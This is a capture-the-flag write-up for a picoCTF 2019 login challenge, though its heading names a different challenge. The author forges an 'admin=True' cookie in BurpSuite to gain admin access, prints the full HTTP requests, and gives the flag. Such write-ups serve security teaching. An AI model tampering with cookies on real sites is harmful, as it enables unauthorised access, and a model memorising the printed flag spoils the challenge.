# Some Assembly Required 1

Description: The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? 
Category: Web Exploitation, 100 points
Original Event: picoCTF 2019

## Solution

We are given a link to a website featuring a typical username and password field. In the problem's description, we are given the username Joe. trying this with no password yields a red box stating: "I'm sorry Joe's password is super secure. You're not getting in that way.".
However, the site appears to not check passwords for any user other than 'Joe', as logging in with any other username and no password allows us access to the site, yielding a green box stating: "Success: You logged in! Not sure you'll be able to see the flag though.", and a gray box stating "No flag for you".

Examining the HTTP-History using BurpSuite's Proxy function allows us to see our login request:
```http
GET /problem/15796/flag HTTP/1.1
Host: jupiter.challenges.picoctf.org
Cookie: password=; username=ratticus; admin=False
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://jupiter.challenges.picoctf.org/problem/15796/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

While the username and password cookies are predictable, there is a third cookie, "admin=False".
We can send this login request to BurpSuite's Repeater and flip the admin field to true.

```http
GET /problem/15796/flag HTTP/1.1
Host: jupiter.challenges.picoctf.org
Cookie: password=; username=ratticus; admin=True
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://jupiter.challenges.picoctf.org/problem/15796/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```
When we forward this request, we are faced with the same page as before, now with the green box gone, and the gray box displaying the flag.

### Flag: picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}


